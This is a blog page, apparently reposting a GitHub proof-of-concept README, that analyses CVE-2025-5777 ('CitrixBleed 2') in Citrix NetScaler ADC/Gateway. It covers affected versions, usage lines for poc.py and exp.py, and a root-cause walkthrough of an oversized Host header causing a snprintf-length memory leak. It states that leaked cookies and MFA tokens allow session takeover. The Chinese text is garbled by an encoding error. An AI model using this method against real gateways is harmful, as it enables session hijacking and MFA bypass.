

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=light>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="lianccc">
  <meta name="keywords" content="">
  
    <meta name="description" content="æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Citrix NetScaler ADC&#x2F;Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´ æ¼æ´ç¼–å·ï¼š  CVEï¼š CVE-2025-5777  æ¼æ´ç±»å‹ï¼š ä¿¡æ¯æ³„éœ² æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š CVE-2025-5777ï¼ˆåˆç§°CitrixBleed 2ï¼‰æ˜¯Citrix NetScaler ADC &#x2F; Gatewayä¸­çš„ä¸€ä¸ªè¶Šç•Œå†…å­˜è¯»å–æ¼æ´ã€‚æ”»å‡»è€…ä¸éœ€è¦è®¤è¯ï¼Œåªéœ€å‘é€ä¸€æ¡">
<meta property="og:type" content="article">
<meta property="og:title" content="Citrix NetScaler ADC&#x2F;Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´">
<meta property="og:url" content="http://example.com/2025/06/30/github_1889405732/index.html">
<meta property="og:site_name" content="liancc&#39; infos blog">
<meta property="og:description" content="æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Citrix NetScaler ADC&#x2F;Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´ æ¼æ´ç¼–å·ï¼š  CVEï¼š CVE-2025-5777  æ¼æ´ç±»å‹ï¼š ä¿¡æ¯æ³„éœ² æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š CVE-2025-5777ï¼ˆåˆç§°CitrixBleed 2ï¼‰æ˜¯Citrix NetScaler ADC &#x2F; Gatewayä¸­çš„ä¸€ä¸ªè¶Šç•Œå†…å­˜è¯»å–æ¼æ´ã€‚æ”»å‡»è€…ä¸éœ€è¦è®¤è¯ï¼Œåªéœ€å‘é€ä¸€æ¡">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-06-30T11:45:18.605Z">
<meta property="article:modified_time" content="2025-06-30T11:45:18.602Z">
<meta property="article:author" content="lianccc">
<meta property="article:tag" content="CVE-2025:github search">
<meta property="article:tag" content="ä¿¡æ¯æ³„éœ²">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>Citrix NetScaler ADC/Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´ - liancc&#39; infos blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="liancc' infos blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Craw Info</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Citrix NetScaler ADC/Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-06-30 11:45" pubdate>
          2025å¹´6æœˆ30æ—¥ ä¸­åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          2.3k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          20 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Citrix NetScaler ADC/Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h1><p><strong>æ¼æ´åç§°ï¼š</strong> Citrix NetScaler ADC&#x2F;Gateway è¶Šç•Œå†…å­˜è¯»å–æ¼æ´</p>
<p><strong>æ¼æ´ç¼–å·ï¼š</strong></p>
<ul>
<li><strong>CVEï¼š</strong> CVE-2025-5777</li>
</ul>
<p><strong>æ¼æ´ç±»å‹ï¼š</strong> ä¿¡æ¯æ³„éœ²</p>
<p><strong>æ¼æ´ç­‰çº§ï¼š</strong> ä¸¥é‡</p>
<p><strong>æ¼æ´æè¿°ï¼š</strong> CVE-2025-5777ï¼ˆåˆç§°CitrixBleed 2ï¼‰æ˜¯Citrix NetScaler ADC &#x2F; Gatewayä¸­çš„ä¸€ä¸ªè¶Šç•Œå†…å­˜è¯»å–æ¼æ´ã€‚æ”»å‡»è€…ä¸éœ€è¦è®¤è¯ï¼Œåªéœ€å‘é€ä¸€æ¡è¶…é•¿Hostå¤´çš„GETè¯·æ±‚ï¼Œå³å¯è®©è®¾å¤‡æŠŠéšæœºå†…å­˜å—è¿åŒHTTPå“åº”ä¸€èµ·â€œå–·â€ç»™å®¢æˆ·ç«¯ã€‚æ³„éœ²æ•°æ®ç»å¸¸åŒ…å«NSC_USER &#x2F; NSC_TASS Cookieã€SAML StateContextã€MFA tokenç­‰å…³é”®ææ–™ï¼Œå¯ç›´æ¥å¤ç”¨å®Œæˆä¼šè¯æ¥ç®¡ä¸MFAç»•è¿‡ã€‚CVSS v4åŸºå‡†è¯„åˆ†9.3ï¼ˆCriticalï¼‰ã€‚</p>
<p><strong>äº§å“å‚å•†ï¼š</strong> Citrix</p>
<p><strong>äº§å“åç§°ï¼š</strong> NetScaler ADC &#x2F; Gateway</p>
<p><strong>å½±å“ç‰ˆæœ¬ï¼š</strong> &lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS</p>
<p><strong>æ¥æºï¼š</strong> <a target="_blank" rel="noopener" href="https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-">https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-</a></p>
<p><strong>ç±»å‹ï¼š</strong> CVE-2025:github search</p>
<h1 id="ä»“åº“æ–‡ä»¶"><a href="#ä»“åº“æ–‡ä»¶" class="headerlink" title="ä»“åº“æ–‡ä»¶"></a>ä»“åº“æ–‡ä»¶</h1><ul>
<li>README.md</li>
<li>exp.py</li>
<li>poc.py</li>
</ul>
<h1 id="æ¥æºæ¦‚è¿°"><a href="#æ¥æºæ¦‚è¿°" class="headerlink" title="æ¥æºæ¦‚è¿°"></a>æ¥æºæ¦‚è¿°</h1><h2 id="CitrixBleed-2-CVE-2025-5777-ç»ˆæè§£æ"><a href="#CitrixBleed-2-CVE-2025-5777-ç»ˆæè§£æ" class="headerlink" title="CitrixBleed 2 (CVE-2025-5777) ç»ˆæè§£æ"></a>CitrixBleed 2 (CVE-2025-5777) ç»ˆæè§£æ</h2><blockquote>
<p>An Out-of-Bounds Memory Read in NetScaler ADC &#x2F; Gateway â€” ä»æˆå› åˆ°æ”»é˜²æ¼”ç»ƒçš„å…¨æ™¯æ‰‹å†Œ</p>
</blockquote>
<hr>
<h2 id="pocç”¨æ³•ï¼špython3-poc-py-https-gateway-example-com"><a href="#pocç”¨æ³•ï¼špython3-poc-py-https-gateway-example-com" class="headerlink" title="pocç”¨æ³•ï¼špython3 poc.py https://gateway.example.com"></a>pocç”¨æ³•ï¼špython3 poc.py <a target="_blank" rel="noopener" href="https://gateway.example.com/">https://gateway.example.com</a></h2><h2 id="expç”¨æ³•ï¼špython3-exp-py-https-gateway-example-com-admin-7acbb35f4dâ€¦"><a href="#expç”¨æ³•ï¼špython3-exp-py-https-gateway-example-com-admin-7acbb35f4dâ€¦" class="headerlink" title="expç”¨æ³•ï¼špython3 exp.py https://gateway.example.com admin 7acbb35f4dâ€¦"></a>expç”¨æ³•ï¼špython3 exp.py <a target="_blank" rel="noopener" href="https://gateway.example.com/">https://gateway.example.com</a> admin 7acbb35f4dâ€¦</h2><h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>x00  å¼•è¨€ <span class="hljs-symbol">/</span> é€Ÿè§ˆ<br><span class="hljs-number">0</span>x01  èƒŒæ™¯ï¼šNetScaler æ¶æ„ä¸ CitrixBleed <span class="hljs-number">1</span> å›é¡¾<br><span class="hljs-number">0</span>x02  æ¼æ´æè¿°ï¼ˆå½±å“ç‰ˆæœ¬ã€CVSSã€åˆ©ç”¨åæœï¼‰<br><span class="hljs-number">0</span>x03  è§¦å‘æœºç†æ·±å‰–ï¼ˆæºç çº§åˆ†æ &amp; è°ƒè¯•æˆªå›¾ï¼‰<br><span class="hljs-number">0</span>x04  æœ€å° PoC <span class="hljs-operator">+</span> é«˜çº§æ‰«æè„šæœ¬<br><span class="hljs-number">0</span>x05  çº¢é˜Ÿè§†è§’ï¼šå®Œæ•´æ”»å‡»é“¾ï¼ˆå‘ç° â†’ æ³„éœ² â†’ ä¼šè¯åŠ«æŒ â†’ å†…ç½‘æ¨ªå‘ï¼‰<br><span class="hljs-number">0</span>x06  è“é˜Ÿè§†è§’ï¼šæ£€æµ‹ã€å–è¯ä¸è¡¥ä¸éªŒè¯<br><span class="hljs-number">0</span>x07  é˜²å¾¡åŠ å›ºï¼šè¡¥ä¸ã€WAFã€é…ç½®ã€èµ„äº§æ²»ç†<br><span class="hljs-number">0</span>x08  å­¦ä¹  <span class="hljs-symbol">/</span> å¤ä¹ è·¯çº¿å›¾ä¸å®æˆ˜å®éªŒ<br>é™„å½• A  Sigma <span class="hljs-symbol">/</span> Suricata <span class="hljs-symbol">/</span> Nginx-Lua è§„åˆ™<br>é™„å½• B  è¡¥ä¸<span class="hljs-operator">/</span>åˆ©ç”¨æ—¶é—´è½´ &amp; IoC å¿«ç…§<br>å‚è€ƒèµ„æ–™<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="0x00-å¼•è¨€-é€Ÿè§ˆ"><a href="#0x00-å¼•è¨€-é€Ÿè§ˆ" class="headerlink" title="0x00  å¼•è¨€ &#x2F; é€Ÿè§ˆ"></a>0x00  å¼•è¨€ &#x2F; é€Ÿè§ˆ</h3><ul>
<li><strong>CVE-2025-5777</strong>ï¼ˆåˆç§° <em>CitrixBleed 2</em>ï¼‰æ˜¯ Citrix NetScaler ADC &#x2F; Gateway ä¸­çš„ <strong>Out-of-Bounds Memory Read</strong>ã€‚</li>
<li>æ”»å‡»è€… <strong>ä¸éœ€è¦è®¤è¯</strong>ï¼Œåªéœ€å‘é€ä¸€æ¡è¶…é•¿ <code>Host</code> å¤´çš„ GET è¯·æ±‚ï¼Œå³å¯è®©è®¾å¤‡æŠŠéšæœºå†…å­˜å—è¿åŒ HTTP å“åº”ä¸€èµ·â€œå–·â€ç»™å®¢æˆ·ç«¯ã€‚</li>
<li>æ³„éœ²æ•°æ®ç»å¸¸åŒ…å« <strong><code>NSC_USER</code> &#x2F; <code>NSC_TASS</code> Cookieã€SAML <code>StateContext</code>ã€MFA token</strong> ç­‰å…³é”®ææ–™ï¼Œå¯ç›´æ¥å¤ç”¨å®Œæˆä¼šè¯æ¥ç®¡ä¸ MFA ç»•è¿‡ (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)ã€‚</li>
<li>CVSS v4 åŸºå‡†è¯„åˆ† 9.3ï¼ˆCriticalï¼‰(<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)ã€‚</li>
<li><strong>2025-06-17</strong> å…¬å¼€ï¼Œ<strong>2025-06-23</strong> Citrix æ‰©å¤§å½±å“èŒƒå›´å¹¶å‘å¸ƒè¡¥ä¸ï¼›<strong>ä¸€å‘¨å†…</strong> ReliaQuestã€Bishop Fox ç­‰å®‰å…¨å‚å•†é™†ç»­è§‚æµ‹åˆ°åœ¨é‡åˆ©ç”¨æ¿€å¢ (<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>, <a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)ã€‚</li>
</ul>
<hr>
<h3 id="0x01-èƒŒæ™¯"><a href="#0x01-èƒŒæ™¯" class="headerlink" title="0x01  èƒŒæ™¯"></a>0x01  èƒŒæ™¯</h3><h4 id="1-1-NetScaler-å·¥ä½œæµç¨‹ç®€è¿°"><a href="#1-1-NetScaler-å·¥ä½œæµç¨‹ç®€è¿°" class="headerlink" title="1.1  NetScaler å·¥ä½œæµç¨‹ç®€è¿°"></a>1.1  NetScaler å·¥ä½œæµç¨‹ç®€è¿°</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ Client       â”‚ â‘  HTTPS<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜<br>       â”‚<br>â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ NetScaler    â”‚ â‘¡ AAA <span class="hljs-symbol">/</span> Gateway è®¤è¯<br>â”‚  (WebProc)   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜<br>       â”‚<br>â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ICA Proxy <span class="hljs-symbol">/</span>  â”‚ â‘¢ æ­£å‘åˆ°åº”ç”¨<br>â”‚ CVPN <span class="hljs-symbol">/</span> RDP   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure>

<p>NetScaler é‡‡ç”¨ <strong>å¤šè¿›ç¨‹ + å†…éƒ¨ IPC</strong> çš„è®¾è®¡ã€‚<code>WebProc</code> è´Ÿè´£å¤„ç† AAA &#x2F; Gateway è·¯å¾„ä¸‹çš„å¤§éƒ¨åˆ† HTTP è¯·æ±‚ï¼ŒåŒ…æ‹¬ <code>/nf/auth/*</code>ã€<code>/oauth/*</code> ç­‰ã€‚å®ƒåœ¨ <strong>C è¯­è¨€</strong> ä¸­å¤§é‡ä½¿ç”¨ <code>snprintf()</code> &#x2F; <code>memcpy()</code>ï¼Œæ¯æ¬¡æ‹¼è£… XML&#x2F;HTML ç‰‡æ®µã€‚</p>
<h4 id="1-2-CitrixBleed-1ï¼ˆCVE-2023-4966ï¼‰å›é¡¾"><a href="#1-2-CitrixBleed-1ï¼ˆCVE-2023-4966ï¼‰å›é¡¾" class="headerlink" title="1.2  CitrixBleed 1ï¼ˆCVE-2023-4966ï¼‰å›é¡¾"></a>1.2  CitrixBleed 1ï¼ˆCVE-2023-4966ï¼‰å›é¡¾</h4><ul>
<li>2023 å¹´åŒç±»æ¼æ´å‘ç”Ÿåœ¨ OAuth å‘ç°æ¥å£ <code>/oauth/idp/.well-known/openid-configuration</code>ã€‚</li>
<li>å…¶æœ¬è´¨åŒæ ·æ˜¯ <strong>ä½¿ç”¨ <code>snprintf</code> è¿”å›å€¼ä½œä¸ºåç»­ <code>send()</code> çš„ <code>len</code> å‚æ•°</strong> â†’ å†…å­˜è¶Šç•Œå›æ˜¾ã€‚</li>
<li>CitrixBleed 2 è¯æ˜ <em>åŒä¸€ç±»å®‰å…¨ç¼–ç ç¼ºé™·</em> ä¾æ—§æ½œä¼åœ¨å…¶ä»–è·¯å¾„ã€‚</li>
</ul>
<blockquote>
<p><strong>Lesson Learned</strong>ï¼šå®‰å…¨è¡¥ä¸è‹¥åªé’ˆå¯¹â€œè½é”¤ç‚¹â€è€Œéâ€œç¼–ç¨‹èŒƒå¼â€ï¼Œå°±ä¼šç•™ä¸‹â€œæ¨¡ç‰ˆåŒ–å¤ç°â€ç©ºé—´ã€‚</p>
</blockquote>
<hr>
<h3 id="0x02-æ¼æ´æè¿°"><a href="#0x02-æ¼æ´æè¿°" class="headerlink" title="0x02  æ¼æ´æè¿°"></a>0x02  æ¼æ´æè¿°</h3><table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td><strong>CVE</strong></td>
<td>CVE-2025-5777</td>
</tr>
<tr>
<td><strong>åˆ«å</strong></td>
<td>CitrixBleed 2</td>
</tr>
<tr>
<td><strong>æ¼æ´ç±»å‹</strong></td>
<td>Out-of-Bounds Read &#x2F; ä¿¡æ¯æ³„éœ²</td>
</tr>
<tr>
<td><strong>CVSS v4 Base</strong></td>
<td>9.3 (Crit.) (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td>
</tr>
<tr>
<td><strong>å—å½±å“ç‰ˆæœ¬</strong></td>
<td>&lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td>
</tr>
<tr>
<td><strong>åˆ©ç”¨æ¡ä»¶</strong></td>
<td>NetScaler è¢«é…ç½®ä¸º Gateway (VPN&#x2F;ICA Proxy&#x2F;CVPN&#x2F;RDP Proxy) <strong>æˆ–</strong> AAA è™šæ‹ŸæœåŠ¡å™¨ (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</td>
</tr>
<tr>
<td><strong>åˆ©ç”¨åæœ</strong></td>
<td>æ³„éœ²å†…å­˜ â†’ ä¼šè¯ä»¤ç‰Œ â†’ è®¤è¯ç»•è¿‡ &#x2F; MFA ç»•è¿‡ â†’ æ¨ªå‘</td>
</tr>
</tbody></table>
<hr>
<h3 id="0x03-è§¦å‘æœºç†æ·±å‰–"><a href="#0x03-è§¦å‘æœºç†æ·±å‰–" class="headerlink" title="0x03  è§¦å‘æœºç†æ·±å‰–"></a>0x03  è§¦å‘æœºç†æ·±å‰–</h3><blockquote>
<p>æœ¬èŠ‚åŸºäºå¯¹ 13.1-55.18 å›ºä»¶çš„åç¼–è¯‘ + gdb è°ƒè¯•ï¼Œç»“åˆå…¬å¼€åšå®¢æ•´ç†è€Œæˆ (<a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)ã€‚</p>
</blockquote>
<h4 id="3-1-æ¼æ´å…¥å£"><a href="#3-1-æ¼æ´å…¥å£" class="headerlink" title="3.1  æ¼æ´å…¥å£"></a>3.1  æ¼æ´å…¥å£</h4><ul>
<li><strong>URI</strong>ï¼š<code>/nf/auth/startwebview.do</code></li>
<li><strong>å¯æ§å‚æ•°</strong>ï¼šHTTP <code>Host</code> å¤´</li>
<li>è¯¥æ¥å£ç”¨äºç”Ÿæˆ Citrix Workspace WebView çš„é‡å®šå‘ XMLï¼Œç¤ºä¾‹æ­£å¸¸å“åº”ï¼š</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wv:StartUrl</span>&gt;</span>https://gateway.example.com/Citrix/AAA/start.html<span class="hljs-tag">&lt;/<span class="hljs-name">wv:StartUrl</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="3-2-å…³é”®å‡½æ•°é“¾"><a href="#3-2-å…³é”®å‡½æ•°é“¾" class="headerlink" title="3.2  å…³é”®å‡½æ•°é“¾"></a>3.2  å…³é”®å‡½æ•°é“¾</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">citrix_webview_handler</span>()<br> â”œâ”€ <span class="hljs-built_in">build_auth_xml</span>()<br> â”‚    â”œâ”€ <span class="hljs-built_in">snprintf</span>(buf, <span class="hljs-number">0</span>x1800, TEMPLATE, host_hdr, ... );<br> â”‚    â””â”€ return length;           <span class="hljs-comment">// âš ï¸ length å¯ ï¼ 0x1800</span><br> â””â”€ <span class="hljs-built_in">ns_vpn_send_response</span>(conn, <span class="hljs-number">0</span>x980200, buf, length);<br></code></pre></td></tr></table></figure>

<blockquote>
<p><strong>Bug ç‚¹</strong>ï¼š<br><code>snprintf</code> è¿”å›â€œæœ¬åº”å†™å…¥çš„é•¿åº¦â€è€Œéå®é™…å†™å…¥é•¿åº¦ï¼›è‹¥ç”¨æˆ·ä¼ å…¥çš„ <code>Host</code> &gt; 0x1800 - å¸¸é‡æ®µé•¿åº¦ï¼Œåˆ™ <code>length</code> &gt; <code>sizeof(buf)</code>ã€‚</p>
</blockquote>
<h4 id="3-3-è¿è¡Œæ—¶ç¤ºæ„"><a href="#3-3-è¿è¡Œæ—¶ç¤ºæ„" class="headerlink" title="3.3  è¿è¡Œæ—¶ç¤ºæ„"></a>3.3  è¿è¡Œæ—¶ç¤ºæ„</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">buf: <span class="hljs-comment">[-----XML-----]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span>......            &lt;- 0x1800 bytes limit<br>                          â†‘<br>                è¢« ns_vpn_send_response ä¸€å¹¶å‘å‡º<br></code></pre></td></tr></table></figure>

<p>GDB æ–­ç‚¹æ¼”ç¤ºï¼ˆå…³é”®å¯„å­˜å™¨ï¼‰ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RDI</span> (dst) = <span class="hljs-number">0</span>x7fffa2e31800  // buf<br><span class="hljs-attribute">RSI</span> (len) = <span class="hljs-number">0</span>x00001e42      // length=<span class="hljs-number">7746</span> (&gt;<span class="hljs-number">6144</span>)<br></code></pre></td></tr></table></figure>

